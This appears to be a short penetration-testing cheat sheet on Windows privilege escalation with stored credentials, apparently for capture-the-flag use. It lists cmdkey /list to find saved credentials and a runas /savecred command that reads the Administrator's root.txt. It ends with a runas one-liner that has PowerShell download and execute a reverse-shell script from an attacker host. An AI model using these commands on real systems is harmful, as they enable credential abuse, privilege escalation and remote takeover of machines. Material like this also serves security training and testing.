[RunAs Command](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11))

```stored-creds
cmdkey /list
```

WinPeas or JAWS will already do cmdkey and grab stored creds

```runas
C:\Windows\System32\runas.exe /user:<SAVEDCRED> /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\US\root.txt"
```

/savecred just means use the saved credentials to do everything in quotes (which just TYPEs out a file and redirects output to the US user)

```runas-rev-shell
runas /user:<SAVEDCRED> "powershell -c IEX (New-Object net.webclient).downloadstring('http://ATTACK_IP/Invoke-PowerShellTCP.ps1')"
```

